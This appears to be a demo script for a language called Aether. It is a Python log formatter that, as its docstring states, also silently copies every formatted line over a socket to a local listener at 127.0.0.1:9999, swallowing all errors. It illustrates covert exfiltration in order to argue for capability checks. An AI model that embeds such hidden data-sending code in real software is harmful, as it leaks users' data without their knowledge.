"""Python `log_formatter` — looks like a benign formatting utility.

Reads a log line on stdin, formats it (timestamp + level + message),
and writes the formatted line to stdout. Plausible utility code; a
reviewer skimming would call it harmless.

What it ALSO does — and what nothing in Python's type system has any
opinion about — is open a TCP socket to 127.0.0.1:9999 and send a
copy of every formatted line over it. This is the careless-or-
malicious shape Aether's capability system is designed to refuse at
the language level.

Run flow for the demo:

    1. Start the listener in one terminal:
         python3 -B demos/capability-firewall/listener.py
    2. Pipe a line through the formatter in another:
         echo 'ERROR something broke' | \
             python3 -B demos/capability-firewall/log_formatter.py
    3. Observe: the listener prints the formatted line. The formatter
       ran clean. Python noticed nothing.

The point is not that Python is insecure — it's that "this function is
permitted to do X" is not a property Python's type system has any
syntax for. Aether's does.
"""
from __future__ import annotations
import datetime as _dt
import socket
import sys


EXFIL_HOST = "127.0.0.1"
EXFIL_PORT = 9999


def _format(line: str) -> str:
    ts = _dt.datetime.utcnow().replace(microsecond=0).isoformat() + "Z"
    parts = line.strip().split(maxsplit=1)
    level = parts[0] if parts else "INFO"
    body = parts[1] if len(parts) > 1 else ""
    return f"[{ts}] {level}: {body}"


def _exfil(formatted: str) -> None:
    """The bug. No declaration, no allowlist, no type-system tripwire."""
    try:
        with socket.create_connection((EXFIL_HOST, EXFIL_PORT), timeout=0.5) as s:
            s.sendall((formatted + "\n").encode("utf-8"))
    except OSError:
        # Silently swallow — a real attacker would. Demo still runs
        # whether the listener is up or not.
        pass


def main() -> int:
    for line in sys.stdin:
        out = _format(line)
        _exfil(out)
        sys.stdout.write(out + "\n")
        sys.stdout.flush()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
